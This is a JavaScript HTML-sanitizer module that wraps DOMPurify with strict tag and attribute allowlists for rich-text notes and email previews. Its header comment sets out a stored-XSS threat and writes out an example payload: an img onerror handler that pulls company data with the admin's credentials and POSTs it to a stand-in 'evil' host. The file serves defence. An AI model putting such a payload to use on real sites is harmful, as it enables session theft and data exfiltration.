// LTP HTML sanitizer — single source of truth for what HTML is allowed to
// reach the DOM. Wraps DOMPurify with a strict allowlist matching exactly
// the tags the rich-text editor's toolbar can produce.
//
// Threat: stored XSS. A member-role user types or pastes malicious HTML
// (e.g. <img src=x onerror="fetch('/api/companies',{credentials:'include'})
// .then(r=>r.json()).then(d=>fetch('https://evil/x',{method:'POST',body:JSON
// .stringify(d)}))">). When an admin views the note, the script runs in the
// admin's session and exfiltrates everything.
//
// Defense in depth:
//   1. Sanitize when the editor saves changes (rich-text-editor.js onInput).
//   2. Sanitize when the editor re-loads existing content (init useEffect).
//   3. Sanitize at every render site that uses dangerouslySetInnerHTML.
//   4. Sanitize at every document.write site (print windows).
//   5. CSP headers from backend block any script that does sneak through.
//
// All callers MUST use LTP_SANITIZE.html() — never call DOMPurify.sanitize
// directly. If we ever swap the library or tighten the allowlist, the
// change happens here once.
(function() {
  // Allowed tags MUST cover what the editor's execCommand buttons emit:
  //   bold/italic/underline/strikeThrough  → <b><i><u><s><strike>
  //   insertUnorderedList/insertOrderedList → <ul><ol><li>
  //   formatBlock H3 / BLOCKQUOTE          → <h3><blockquote>
  // Plus structural elements browsers wrap pasted text in: <p><div><br>.
  // NO attributes are allowed — class/id/style/etc. all stripped. This is
  // strict but the editor doesn't produce any either.
  var ALLOWED_TAGS = ["b", "i", "u", "s", "strike", "p", "div", "br",
                      "ul", "ol", "li", "h3", "blockquote"];
  var CONFIG = {
    ALLOWED_TAGS: ALLOWED_TAGS,
    ALLOWED_ATTR: [],
    KEEP_CONTENT: true,          // strip tags but keep text inside
    ALLOW_DATA_ATTR: false,
    USE_PROFILES: { html: true },
  };

  function html(input) {
    if (input == null) return "";
    // DOMPurify is loaded as a global by index.html. If it failed to load
    // (network error, blocked by CSP, etc.), fall back to text-only: strip
    // ALL tags by treating the input as text content. Defensive — should
    // never happen in production where the script tag has SRI + is required.
    if (!window.DOMPurify) {
      console.error("[LTP] DOMPurify not loaded — falling back to text-only render");
      var tmp = document.createElement("div");
      tmp.textContent = String(input);
      return tmp.innerHTML;
    }
    return window.DOMPurify.sanitize(String(input), CONFIG);
  }

  // ─── Email allowlist ────────────────────────────────────────────────────
  // Separate, broader allowlist for email TEMPLATES and email BODIES — admins
  // paste templates from marketing tools (Mailchimp, Stripo) that rely on
  // tables for layout, inline styles for typography, and anchors for the
  // {{viewUrl}} button. This needs to MIRROR backend/sanitize.py's
  // ALLOWED_TAGS + ALLOWED_ATTRIBUTES exactly — otherwise the live preview
  // in the Send modal renders something different from what actually goes
  // out to the recipient, defeating the point of a preview.
  //
  // Used by:
  //   - Settings page email-template editor (preview pane)
  //   - Send modal body preview (commit 5)
  //   - Send modal signature template render
  //
  // NOT used by the rich-text editor — that stays on the narrow .html()
  // path because it only produces a tiny subset.
  var EMAIL_ALLOWED_TAGS = [
    "b", "i", "u", "strong", "em", "span", "br", "small", "sub", "sup",
    "p", "div", "h1", "h2", "h3", "h4", "blockquote", "hr",
    "ul", "ol", "li",
    "table", "thead", "tbody", "tfoot", "tr", "th", "td",
    "a", "img",
    // Section — used by EmailBodyEditor as the marker wrapper for the
    // auto-managed signature + header blocks. Mirror of backend/sanitize.py.
    "section",
  ];
  // DOMPurify takes ALLOWED_ATTR as a flat list (not per-tag); the resulting
  // permission is "this attr may appear on any tag in ALLOWED_TAGS." That's
  // looser than the backend's per-tag map but acceptable for a PREVIEW
  // surface — the backend remains authoritative at save and send time, so
  // any attribute drift gets normalized server-side.
  // `role` lets the customer-facing header table keep role="presentation"
  // (accessibility for table-layout emails).
  var EMAIL_ALLOWED_ATTR = [
    "class", "style", "title", "align", "role",
    "href", "target", "rel",
    "src", "alt", "width", "height",
    "colspan", "rowspan", "valign", "scope",
    "border", "cellpadding", "cellspacing",
  ];
  var EMAIL_CONFIG = {
    ALLOWED_TAGS: EMAIL_ALLOWED_TAGS,
    ALLOWED_ATTR: EMAIL_ALLOWED_ATTR,
    ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto|tel):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i,
    KEEP_CONTENT: true,
    ALLOW_DATA_ATTR: false,
    USE_PROFILES: { html: true },
  };

  function emailHtml(input) {
    if (input == null) return "";
    if (!window.DOMPurify) {
      console.error("[LTP] DOMPurify not loaded — falling back to text-only render");
      var tmp = document.createElement("div");
      tmp.textContent = String(input);
      return tmp.innerHTML;
    }
    return window.DOMPurify.sanitize(String(input), EMAIL_CONFIG);
  }

  window.LTP_SANITIZE = {
    html: html,
    emailHtml: emailHtml,
    ALLOWED_TAGS: ALLOWED_TAGS.slice(),                  // diagnostics
    EMAIL_ALLOWED_TAGS: EMAIL_ALLOWED_TAGS.slice(),      // diagnostics
  };
})();
